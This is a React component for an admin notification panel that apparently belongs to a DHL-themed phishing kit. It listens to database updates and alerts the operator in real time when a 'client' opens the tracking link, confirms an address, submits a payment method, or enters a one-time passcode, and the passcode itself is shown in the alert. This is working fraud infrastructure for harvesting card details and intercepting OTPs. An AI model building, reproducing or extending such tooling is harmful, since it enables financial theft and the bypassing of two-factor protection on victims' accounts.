'use client'

import { useEffect, useState } from 'react'
import { createClient } from '@/utils/supabase/client'
import { Bell, X, CheckCircle, AlertCircle, CreditCard, KeyRound } from 'lucide-react'

type Notification = {
    id: string;
    clientId: string;
    message: string;
    time: Date;
    read: boolean;
    type: 'info' | 'success' | 'warning';
}

export function NotificationCenter() {
    const supabase = createClient()
    const [notifications, setNotifications] = useState<Notification[]>([])
    const [isOpen, setIsOpen] = useState(false)
    const [toast, setToast] = useState<Notification | null>(null)

    useEffect(() => {
        const channel = supabase
            .channel('admin-notifications')
            .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'clients' }, (payload) => {
                const newState = payload.new.state;
                const oldState = payload.old.state;

                // Only notify if state actually changed to something we care about
                if (newState !== oldState) {
                    let message = '';
                    let type: 'info' | 'success' | 'warning' = 'info';

                    if (newState === 'ADDRESS_CONFIRMED') {
                        message = `Client ${payload.new.id.substring(0, 8)} confirmed their address.`;
                    } else if (newState === 'PAYMENT_SUBMITTED') {
                        message = `Client ${payload.new.id.substring(0, 8)} submitted a payment method.`;
                        type = 'warning';
                    } else if (newState === 'OTP_SUBMITTED') {
                        message = `Client ${payload.new.id.substring(0, 8)} entered an OTP: ${payload.new.otp_code || '***'}.`;
                        type = 'warning';
                    } else if (newState === 'LINK_CLICKED') {
                        message = `Client ${payload.new.id.substring(0, 8)} opened the tracking link.`;
                    }

                    if (message) {
                        const newNotif: Notification = {
                            id: Math.random().toString(36).substr(2, 9),
                            clientId: payload.new.id,
                            message,
                            time: new Date(),
                            read: false,
                            type
                        }

                        setNotifications(prev => [newNotif, ...prev].slice(0, 50)) // Keep last 50

                        // Show toast
                        setToast(newNotif)
                        setTimeout(() => setToast(null), 5000) // Hide toast after 5s
                    }
                }
            })
            .subscribe()

        return () => {
            supabase.removeChannel(channel)
        }
    }, [supabase])

    const unreadCount = notifications.filter(n => !n.read).length

    const markAllRead = () => {
        setNotifications(prev => prev.map(n => ({ ...n, read: true })))
        setIsOpen(false)
    }

    const getIcon = (type: string) => {
        if (type === 'warning') return <AlertCircle className="w-4 h-4 text-dhl-yellow" />
        if (type === 'success') return <CheckCircle className="w-4 h-4 text-green-500" />
        return <Bell className="w-4 h-4 text-blue-500" />
    }

    return (
        <div className="relative">
            {/* Bell Icon */}
            <button
                onClick={() => setIsOpen(!isOpen)}
                className="relative p-2 text-gray-700 bg-white rounded hover:bg-gray-100 transition border border-transparent hover:border-gray-200 focus:outline-none"
            >
                <Bell className="w-5 h-5" />
                {unreadCount > 0 && (
                    <span className="absolute top-0 right-0 inline-flex items-center justify-center px-1.5 py-0.5 text-xs font-bold leading-none text-white transform translate-x-1/4 -translate-y-1/4 bg-dhl-red rounded-full">
                        {unreadCount}
                    </span>
                )}
            </button>

            {/* Dropdown Menu */}
            {isOpen && (
                <div className="absolute right-0 mt-2 w-80 bg-white rounded-md shadow-xl border border-gray-200 z-50">
                    <div className="flex justify-between items-center p-3 border-b bg-gray-50 rounded-t-md">
                        <h3 className="font-bold text-sm text-gray-800">Notifications</h3>
                        {unreadCount > 0 && (
                            <button onClick={markAllRead} className="text-xs text-blue-600 hover:underline">
                                Mark all as read
                            </button>
                        )}
                    </div>
                    <div className="max-h-96 overflow-y-auto">
                        {notifications.length === 0 ? (
                            <div className="p-4 text-center text-sm text-gray-500 italic">No recent notifications.</div>
                        ) : (
                            <ul className="divide-y divide-gray-100">
                                {notifications.map((notif) => (
                                    <li key={notif.id} className={`p-3 hover:bg-gray-50 transition ${!notif.read ? 'bg-blue-50/30' : ''}`}>
                                        <div className="flex items-start gap-3">
                                            <div className="mt-0.5">{getIcon(notif.type)}</div>
                                            <div className="flex-1">
                                                <p className={`text-sm ${!notif.read ? 'font-semibold text-gray-900' : 'text-gray-700'}`}>
                                                    {notif.message}
                                                </p>
                                                <p className="text-xs text-gray-500 mt-1">
                                                    {notif.time.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                                                </p>
                                            </div>
                                        </div>
                                    </li>
                                ))}
                            </ul>
                        )}
                    </div>
                </div>
            )}

            {/* Toast Overlay */}
            {toast && (
                <div className="fixed bottom-4 right-4 z-50 max-w-sm bg-white rounded-lg shadow-2xl border-l-4 border-dhl-red p-4 transform transition-all duration-300 ease-in-out">
                    <div className="flex justify-between items-start gap-4">
                        <div className="flex items-center gap-3">
                            <div className="bg-red-50 p-2 rounded-full">
                                <Bell className="w-5 h-5 text-dhl-red" />
                            </div>
                            <div>
                                <h4 className="font-bold text-sm text-gray-900">New Action Detected!</h4>
                                <p className="text-sm text-gray-600 mt-0.5">{toast.message}</p>
                            </div>
                        </div>
                        <button onClick={() => setToast(null)} className="text-gray-400 hover:text-gray-600">
                            <X className="w-4 h-4" />
                        </button>
                    </div>
                </div>
            )}
        </div>
    )
}
